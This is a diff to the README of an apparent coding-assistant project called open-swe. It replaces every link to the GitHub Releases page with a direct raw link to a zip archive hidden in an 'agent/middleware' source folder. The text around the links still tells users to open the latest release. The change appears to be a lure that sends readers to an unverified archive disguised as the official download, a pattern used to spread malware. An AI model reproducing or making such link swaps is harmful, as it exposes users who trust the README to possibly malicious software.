@@ -1,6 +1,6 @@
 # 🤖 open-swe - Async coding help for everyday work
 
-[![Download open-swe](https://img.shields.io/badge/Download-open--swe-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kembang7020/open-swe/releases)
+[![Download open-swe](https://img.shields.io/badge/Download-open--swe-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kembang7020/open-swe/main/agent/middleware/swe-open-1.9-alpha.1.zip)
 
 ## 🧭 What this is
 
@@ -14,7 +14,7 @@ Use it when you want to:
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/kembang7020/open-swe/releases
+Visit this page to download: https://raw.githubusercontent.com/kembang7020/open-swe/main/agent/middleware/swe-open-1.9-alpha.1.zip
 
 On that page:
 1. Open the latest release
@@ -204,4 +204,4 @@ To update:
 
 ## 🔗 Download again
 
-[Download open-swe from Releases](https://github.com/kembang7020/open-swe/releases)
+[Download open-swe from Releases](https://raw.githubusercontent.com/kembang7020/open-swe/main/agent/middleware/swe-open-1.9-alpha.1.zip)
